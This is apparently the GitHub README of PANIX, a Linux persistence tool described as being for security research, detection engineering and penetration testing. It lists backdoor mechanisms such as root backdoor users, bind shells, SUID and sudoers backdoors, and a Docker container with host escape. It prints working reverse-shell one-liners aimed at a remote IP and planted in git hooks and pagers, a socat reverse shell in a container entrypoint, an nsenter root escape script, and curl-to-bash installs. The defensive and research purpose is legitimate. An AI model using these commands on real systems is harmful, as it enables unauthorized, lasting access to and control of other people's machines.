<p align="center">
  <img src="https://github.com/user-attachments/assets/92536790-efb0-44c0-8d53-fc8b0d1e8683" alt="PANIX logo"width="1010" height="750"> 
  <h1 align="center"><a href="https://github.com/Aegrah/PANIX/">PANIX - Persistence Against *NIX</a></h1>
</p>

![](https://i.imgur.com/waxVImv.png)

PANIX is a highly customizable Linux persistence tool for security research, detection engineering, penetration testing, CTFs and more. It prioritizes functionality over stealth and is easily detectable. PANIX is supported on popular distributions like Debian, Ubuntu, and RHEL, and is highly customizable to fit various OS environments. PANIX will be kept up-to-date with the most common *nix persistence mechanisms observed in the wild.

![](https://i.imgur.com/waxVImv.png)

# Features
PANIX provides a versatile suite of features for simulating and researching Linux persistence mechanisms.

| Feature                          | Description                                                                             | Root | User |
|----------------------------------|-----------------------------------------------------------------------------------------|------|------|
| **At Job Persistence**           | At job persistence                                                                      | ✓    | ✓    |
| **Authorized Keys Persistence**  | Add public key to authorized keys                                                       | ✓    | ✓    |
| **Backdoor User**                | Create backdoor user with uid=0                                                         | ✓    | ✗    |
| **Bind Shell**                   | Execute backgrounded bind shell                                                         | ✓    | ✓    |
| **Capabilities Backdoor**        | Add capabilities for persistence                                                        | ✓    | ✗    |
| **Cron Job Persistence**         | Cron job persistence                                                                    | ✓    | ✓    |
| **Create User**                  | Create a new user                                                                       | ✓    | ✗    |
| **Git Persistence**              | Git hook/pager persistence                                                              | ✓    | ✓    |
| **Generator Persistence**        | Systemd generator persistence                                                           | ✓    | ✗    |
| **Init.d Backdoor**              | SysV Init (init.d) persistence                                                          | ✓    | ✗    |
| **Malicious Package Backdoor**   | DPKG/RPM package persistence                                                            | ✓    | ✗    |
| **Docker Container Backdoor**    | Docker container with host escape                                                       | ✓    | ✓    |
| **MOTD Backdoor**                | Message Of The Day (MOTD) persistence                                                   | ✓    | ✗    |
| **Package Manager Persistence**  | Package Manager persistence (APT/YUM/DNF)                                               | ✓    | ✗    |
| **/etc/passwd Modification**     | Add user to /etc/passwd directly                                                        | ✓    | ✗    |
| **Password Change**              | Change user password                                                                    | ✓    | ✗    |
| **RC.local Backdoor**            | Run Control (rc.local) persistence                                                      | ✓    | ✗    |
| **Shell Profile Persistence**    | Shell profile persistence                                                               | ✓    | ✓    |
| **SSH Key Persistence**          | SSH key persistence                                                                     | ✓    | ✓    |
| **Sudoers Backdoor**             | Sudoers persistence                                                                     | ✓    | ✗    |
| **SUID Backdoor**                | SUID persistence                                                                        | ✓    | ✗    |
| **System Binary Backdoor**       | System binary wrapping for persistence                                                  | ✓    | ✗    |
| **Systemd Service Persistence**  | Systemd service persistence                                                             | ✓    | ✓    |
| **Udev Persistence**             | Udev (driver) persistence                                                               | ✓    | ✗    |
| **XDG Autostart Persistence**    | XDG autostart persistence                                                               | ✓    | ✓    |


![](https://i.imgur.com/waxVImv.png)

# Support
PANIX offers comprehensive support across various Linux distributions.

| Distribution     | Support | Tested                                                |
|------------------|---------|-------------------------------------------------------|
| **Debian**       | ✓       | Fully tested on Debian 11 & 12                       |
| **Ubuntu**       | ✓       | Fully tested on Ubuntu 22.04                         |
| **RHEL**         | ✓       | Fully tested on RHEL 9 (MOTD unavailable)            |
| **CentOS**       | ✓       | Fully tested on CentOS Stream 9, 7 (MOTD unavailable)|
| **Fedora**       | ✓       | Not fully tested                                     |
| **Arch Linux**   | ✓       | Not fully tested                                     |
| **OpenSUSE**     | ✓       | Not fully tested                                     |

Dated or custom Linux distributions may use different configurations or lack specific features, potentially causing mechanisms to fail on untested versions. If a default command fails, the `--custom` flag in most features allows you to customize paths/commands to suit your environment. If that doesn't work, you can examine the script to understand and adapt it to your needs.

**Contributions via pull requests or issues for new features, updates, or ideas are always welcome!**

![](https://i.imgur.com/waxVImv.png)

# Getting Started
Getting PANIX up-and-running is as simple as downloading the script from the [release page](https://github.com/Aegrah/PANIX/releases/tag/panix-v1.0.0) and executing it:
```
curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v1.0.0/panix.sh | bash
```
Or download it and execute it manually:
```
# Download through curl or wget
curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v1.0.0/panix.sh -o panix.sh
wget https://github.com/Aegrah/PANIX/releases/download/panix-v1.0.0/panix.sh -O panix.sh

# Grant execution permissions and execute the script.
chmod +x panix.sh
./panix.sh
```

Executing the script will either show the `root` or `user` help menu, depending on the privileges the current user has.

```
panix@panix-demo:~$ sudo ./panix.sh
 __
|__)  /\  |\ | | \_/
|    /~~\ | \| | / \

@RFGroenewoud

Root User Options:

  --at                  At job persistence
  --authorized-keys     Add public key to authorized keys
  --backdoor-user       Create backdoor user
  --bind-shell          Execute backgrounded bind shell
  --cap                 Add capabilities persistence
  --create-user         Create a new user
  --cron                Cron job persistence
  --docker-container    Docker container with host escape
  --generator           Generator persistence
  --git                 Git hook/pager persistence
  --initd               SysV Init (init.d) persistence
  --malicious-package   Build and Install a package for persistence (DPKG/RPM)
  --motd                Message Of The Day (MOTD) persistence (not available on RHEL derivatives)
  --package-manager     Package Manager persistence (APT/YUM/DNF)
  --passwd-user         Add user to /etc/passwd directly
  --password-change     Change user password
  --rc-local            Run Control (rc.local) persistence
  --shell-profile       Shell profile persistence
  --ssh-key             SSH key persistence
  --sudoers             Sudoers persistence
  --suid                SUID persistence
  --system-binary       System binary persistence
  --systemd             Systemd service persistence
  --udev                Udev (driver) persistence
  --xdg                 XDG autostart persistence
  --revert              Revert most changes made by PANIX's default options
  --quiet (-q)          Quiet mode (no banner)
```

![](https://i.imgur.com/waxVImv.png)

# Examples
The script should be largely self-explanatory, however, this section will show a few examples of how to work with PANIX.

Every persistence mechanism has a separate help menu:

```
root@ubuntu2204:/home/ruben# ./panix.sh --udev --help
Usage: ./panix.sh --udev [OPTIONS]
--examples                   Display command examples
--default                    Use default udev settings
  --ip <ip>                    Specify IP address
  --port <port>                Specify port number
  --at | --cron | --systemd    Specify the mechanism to use
--custom                     Use custom udev settings
  --command <command>          Specify custom command
  --path <path>                Specify custom path
```

Every persistence mechanism also has an `--examples` flag that shows default and custom examples, aiding in crafting the command that works for you.
```
root@ubuntu2204:/home/ruben# ./panix.sh --git --examples
Examples:
--default:
./panix.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager

--custom:
./panix.sh --git --custom --command "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &" --path "gitdir/.git/hooks/pre-commit" --hook

./panix.sh --git --custom --command "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & ${PAGER:-less}" --path "~/.gitconfig --pager"
```
Most of the persistence mechanisms are very simple, and will (hopefully) not require much explanation. For example, systemd persistence can be set up simply through executing:
```
root@ubuntu2204:/home/ruben# ./panix.sh --systemd --default --ip 10.10.10.10 --port 1337
Service file created successfully!
Timer file created successfully!
Created symlink /etc/systemd/system/timers.target.wants/dbus-org.freedesktop.resolved.timer → /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer.
[+] Systemd service persistence established!
```
When setting up a persistence mechanism, the script will let you know whether it worked, and in cases where information is needed to work with the persistence mechanism, additional information is provided. For example the bind shell mechanism:
```
root@ubuntu2204:/home/ruben# ./panix.sh --bind-shell --default --architecture x64
[+] Bind shell binary /tmp/bd64 created and executed in the background.
[+] The bind shell is listening on port 9001.
[+] To interact with it from a different system, use: nc -nv <IP> 9001
[+] Bind shell persistence established!
```
Allowing you to interact with the bind shell:
```
❯ nc -nv 192.168.211.130 9001
(UNKNOWN) [192.168.211.130] 9001 (?) open
whoami
root
```
The same goes for mechanisms that have additional built-in features such as the Docker persistence mechanism, with a built-in root host escape:
```
ruben@ubuntu2204:~$ sudo ./panix.sh --docker-container --ip 192.168.211.131 --port 330
[+] Building 10.4s (9/9) FINISHED                                                                                                                                            docker:default
 => [internal] load build definition from Dockerfile                                                                                                                                   0.0s
 => => transferring dockerfile: 722B                                                                                                                                                   0.0s
 => [internal] load metadata for docker.io/library/alpine:latest                                                                                                                       2.1s
 => [internal] load .dockerignore                                                                                                                                                      0.0s
 => => transferring context: 2B                                                                                                                                                        0.0s
 => [1/5] FROM docker.io/library/alpine:latest@sha256:b89d9c93e9ed3597455c90a0b88a8bbb5cb7188438f70953fede212a0c4394e0                                                                 0.8s
 => => resolve docker.io/library/alpine:latest@sha256:b89d9c93e9ed3597455c90a0b88a8bbb5cb7188438f70953fede212a0c4394e0                                                                 0.0s
 => => sha256:b89d9c93e9ed3597455c90a0b88a8bbb5cb7188438f70953fede212a0c4394e0 1.85kB / 1.85kB                                                                                         0.0s
 => => sha256:dabf91b69c191a1a0a1628fd6bdd029c0c4018041c7f052870bb13c5a222ae76 528B / 528B                                                                                             0.0s
 => => sha256:a606584aa9aa875552092ec9e1d62cb98d486f51f389609914039aabd9414687 1.47kB / 1.47kB                                                                                         0.0s
 => => sha256:ec99f8b99825a742d50fb3ce173d291378a46ab54b8ef7dd75e5654e2a296e99 3.62MB / 3.62MB                                                                                         0.4s
 => => extracting sha256:ec99f8b99825a742d50fb3ce173d291378a46ab54b8ef7dd75e5654e2a296e99                                                                                              0.2s
 => [2/5] RUN apk add --no-cache bash socat sudo util-linux procps                                                                                                                     4.4s
 => [3/5] RUN adduser -D lowprivuser                                                                                                                                                   0.6s
 => [4/5] RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh && echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:192.168.211.131:330"  0.8s
 => [5/5] RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh && echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh && chmod +x /usr/local/bin/escape.sh && ec  0.8s
 => exporting to image                                                                                                                                                                 0.6s
 => => exporting layers                                                                                                                                                                0.6s
 => => writing image sha256:b36eb0d13ee1a0c57c3e6a1ee0255ef474986f44d65b177c539b2ffb1d248790                                                                                           0.0s
 => => naming to docker.io/library/malicious-container                                                                                                                                 0.0s
86ce6b00e872bb8c21d0dae21e747e830bb70b44ab7946558e563bf7f4b626ef
[+] Persistence through malicious Docker container complete.
[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'.
```
Which shows you exactly how to escape the container, and get access to the host.
```
❯ nc -nvlp 330
listening on [any] 330 ...
connect to [192.168.211.131] from (UNKNOWN) [192.168.211.130] 43400
86ce6b00e872:/$ /usr/local/bin/escape.sh
/usr/local/bin/escape.sh
root@ubuntu2204:~#
```

PANIX can clean most of its mess through the `--revert` command.
```
root@ubuntu2204:/home/ruben# ./panix.sh --revert
[*] Running as root...
[*] Cleaning Systemd persistence methods...
[+] Successfully cleaned persistence method Systemd
[*] Cleaning Cron persistence methods...
[+] Successfully cleaned persistence method Cron
...
[*] Cleaning Docker persistence methods...
[+] Successfully cleaned persistence method Docker
[*] Cleaning Malicious package persistence methods...
[+] Successfully cleaned persistence method Malicious package
```

![](https://i.imgur.com/waxVImv.png)
# Publications and Resources
Publications in which PANIX is leveraged:

- [Linux Detection Engineering - The Basics of Linux Persistence](link) (will be published soon...)
- [Linux Detection Engineering - Beyond the Basics of Linux Persistence](link) (will be published soon...)

Feel free to check out my socials for updates on (Linux) security research.

<p align="left">
<a href="https://twitter.com/RFGroenewoud"><img src="https://img.shields.io/badge/%E2%9C%A8-Twitter%20-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="Twitter"/></a>
<a href="https://www.linkedin.com/in/ruben-groenewoud/"><img src="https://img.shields.io/badge/%E2%9C%A8-LinkedIn-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="LinkedIn"/></a>
<a href="https://www.rgrosec.com/"><img src="https://img.shields.io/badge/%E2%9C%A8-Blog-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="Blog"/></a>
<a href="https://github.com/Aegrah"><img src="https://img.shields.io/badge/%E2%9C%A8-GitHub-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="GitHub"/></a>

![](https://i.imgur.com/waxVImv.png)

# Share
By sharing [PANIX](https://github.com/Aegrah/PANIX), you can assist others in testing and improving their security posture and support the development of new detection capabilities in Linux security.

[![GitHub Repo stars](https://img.shields.io/badge/share%20on-reddit-red?logo=reddit)](https://reddit.com/submit?url=[https://github.com/Aegrah/PANIX](https://github.com/Aegrah/PANIX)&title=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20\(PANIX\))
[![GitHub Repo stars](https://img.shields.io/badge/share%20on-hacker%20news-orange?logo=ycombinator)](https://news.ycombinator.com/submitlink?u=https://github.com/Aegrah/PANIX)
[![GitHub Repo stars](https://img.shields.io/badge/share%20on-twitter-03A9F4?logo=twitter)](https://twitter.com/share?url=https://github.com/Aegrah/PANIX&text=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20\(PANIX\))
[![GitHub Repo stars](https://img.shields.io/badge/share%20on-facebook-1976D2?logo=facebook)](https://www.facebook.com/sharer/sharer.php?u=https://github.com/Aegrah/PANIX)
[![GitHub Repo stars](https://img.shields.io/badge/share%20on-linkedin-3949AB?logo=linkedin)](https://www.linkedin.com/shareArticle?url=https://github.com/Aegrah/PANIX&title=Aegrah's%20Linux%20Persistence%20Honed%20Assistant%20(PANIX))

![](https://i.imgur.com/waxVImv.png)

# Disclaimer
PANIX is intended for authorized security testing and research purposes only. Misuse of this tool for malicious activities is not condoned and is entirely at the user's own risk. By using PANIX, you agree that you are responsible for your own actions. Just don't do stupid stuff.
